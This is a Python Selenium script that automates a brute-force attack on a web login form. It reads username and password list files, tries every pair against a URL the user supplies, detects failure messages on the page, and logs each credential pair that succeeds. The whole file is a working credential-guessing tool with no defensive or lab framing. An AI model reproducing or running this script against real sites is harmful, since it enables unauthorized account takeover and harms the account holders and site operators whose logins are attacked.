import time
import logging
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def initialize_driver():
    return webdriver.Chrome()

def login(driver, url, username, password):
    driver.get(url)
    try:
        # Locate the username, password, and login button elements
        username_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'username')))
        password_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'password')))
        login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//button[contains(@class, 'btn-outline-primary') and contains(@class, 'm-2')]")))

        # Fill in the username and password fields
        username_field.clear()
        username_field.send_keys(username)
        password_field.clear()
        password_field.send_keys(password)

        # Click the login button
        login_button.click()

        time.sleep(2)  # Adjust as needed

        # Check for successful login or failure
        if "Credential Mismatched" not in driver.page_source and "No Record Found" not in driver.page_source:
            logger.info(f'Successful Login: Username => {username}, Password => {password}')
        else:
            logger.info(f'Login Failed: Username => {username}, Password => {password}')

        # Logout and return to the login page for the next attempt
        driver.get(url)
        time.sleep(2)  # Adjust as needed
    except Exception as e:
        logger.error(f'Error: {str(e)}')

def main():
    url = input('[+] Enter Page URL: ')
    username_file = input('[+] Enter Username List: ')
    password_file = input('[+] Enter Password List: ')

    driver = initialize_driver()

    with open(username_file, 'r') as usernames, open(password_file, 'r') as passwords:
        username_list = usernames.readlines()
        password_list = passwords.readlines()

    for username in username_list:
        for password in password_list:
            username = username.strip()
            password = password.strip()
            logger.info(f'Trying Username: {username} with Password: {password}')
            login(driver, url, username, password)

    driver.quit()

if __name__ == '__main__':
    main()
